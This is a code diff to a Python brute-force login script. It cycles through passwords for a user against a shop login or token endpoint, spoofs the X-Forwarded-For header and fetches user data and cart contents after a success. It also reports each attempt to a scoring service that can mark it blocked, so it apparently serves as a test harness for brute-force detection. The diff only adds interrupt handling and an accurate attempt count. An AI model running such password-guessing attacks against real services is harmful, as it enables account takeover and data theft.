@@ -45,88 +45,93 @@ def attack(
     start = time.time()
 
     session = requests.Session()
-    for i in range(1, attempts + 1):
-        pwd = next(pool)
-        ip = "10.0.0.1"
-        user = "alice"
+    attempted = 0
+    try:
+        for i in range(1, attempts + 1):
+            attempted = i
+            pwd = next(pool)
+            ip = "10.0.0.1"
+            user = "alice"
 
-        token = None
-        if use_jwt:
-            login_resp = session.post(
-                f"{score_base}/api/token",
-                data={"username": user, "password": pwd},
-                timeout=3,
-            )
-            login_ok = login_resp.status_code == 200
-            token = login_resp.json().get("access_token") if login_ok else None
-            if token:
-                session.get(
-                    f"{score_base}/api/alerts",
-                    headers={"Authorization": f"Bearer {token}"},
+            token = None
+            if use_jwt:
+                login_resp = session.post(
+                    f"{score_base}/api/token",
+                    data={"username": user, "password": pwd},
                     timeout=3,
                 )
-        else:
-            login_resp = session.post(
-                f"{shop_url}/login",
-                json={"username": user, "password": pwd},
-                headers={"X-Forwarded-For": ip},
-                timeout=3,
-            )
-            login_ok = login_resp.status_code == 200
-
-        score_payload = {
-            "client_ip": ip,
-            "auth_result": "success" if login_ok else "failure",
-            "with_jwt": use_jwt,
-        }
-
-        try:
-            score_resp = requests.post(
-                f"{score_base}/score",
-                json=score_payload,
-                timeout=3,
-            )
-            if score_resp.json().get("status") == "blocked":
-                blocked += 1
-        except requests.exceptions.RequestException as exc:
-            print("SCORE ERROR:", exc)
-
-        if login_ok:
-            success += 1
-            if token:
-                try:
-                    info_resp = requests.get(
-                        f"{score_base}/api/me",
+                login_ok = login_resp.status_code == 200
+                token = login_resp.json().get("access_token") if login_ok else None
+                if token:
+                    session.get(
+                        f"{score_base}/api/alerts",
                         headers={"Authorization": f"Bearer {token}"},
                         timeout=3,
                     )
-                    if info_resp.status_code == 200:
-                        data = info_resp.json()
-                        if first_user_info is None:
-                            first_user_info = data
-                        print(f"Retrieved user data: {data}")
-                except Exception as exc:
-                    print("INFO ERROR:", exc)
-            if first_cart is None:
-                try:
-                    cart_resp = session.get(
-                        f"{shop_url}/cart",
-                        headers={"X-Reauth-Password": pwd},
-                        timeout=3,
-                    )
-                    if cart_resp.status_code == 200:
-                        first_cart = cart_resp.json()
-                        print(f"Retrieved cart: {first_cart}")
-                except Exception as exc:
-                    print("CART ERROR:", exc)
-            if first_success_attempt is None:
-                first_success_attempt = i
-                first_success_time = time.time() - start
+            else:
+                login_resp = session.post(
+                    f"{shop_url}/login",
+                    json={"username": user, "password": pwd},
+                    headers={"X-Forwarded-For": ip},
+                    timeout=3,
+                )
+                login_ok = login_resp.status_code == 200
 
-        time.sleep(1 / rate_per_sec)
+            score_payload = {
+                "client_ip": ip,
+                "auth_result": "success" if login_ok else "failure",
+                "with_jwt": use_jwt,
+            }
+
+            try:
+                score_resp = requests.post(
+                    f"{score_base}/score",
+                    json=score_payload,
+                    timeout=3,
+                )
+                if score_resp.json().get("status") == "blocked":
+                    blocked += 1
+            except requests.exceptions.RequestException as exc:
+                print("SCORE ERROR:", exc)
+
+            if login_ok:
+                success += 1
+                if token:
+                    try:
+                        info_resp = requests.get(
+                            f"{score_base}/api/me",
+                            headers={"Authorization": f"Bearer {token}"},
+                            timeout=3,
+                        )
+                        if info_resp.status_code == 200:
+                            data = info_resp.json()
+                            if first_user_info is None:
+                                first_user_info = data
+                            print(f"Retrieved user data: {data}")
+                    except Exception as exc:
+                        print("INFO ERROR:", exc)
+                if first_cart is None:
+                    try:
+                        cart_resp = session.get(
+                            f"{shop_url}/cart",
+                            headers={"X-Reauth-Password": pwd},
+                            timeout=3,
+                        )
+                        if cart_resp.status_code == 200:
+                            first_cart = cart_resp.json()
+                            print(f"Retrieved cart: {first_cart}")
+                    except Exception as exc:
+                        print("CART ERROR:", exc)
+                if first_success_attempt is None:
+                    first_success_attempt = i
+                    first_success_time = time.time() - start
+
+            time.sleep(1 / rate_per_sec)
+    except KeyboardInterrupt:
+        print("Interrupted by user, printing summary...")
 
     total_time = time.time() - start
-    print(f"Attempts: {attempts}, successes: {success}, blocked: {blocked}")
+    print(f"Attempts: {attempted}, successes: {success}, blocked: {blocked}")
     if first_success_attempt:
         print(
             f"First success after {first_success_attempt} attempts ({first_success_time:.2f}s)"
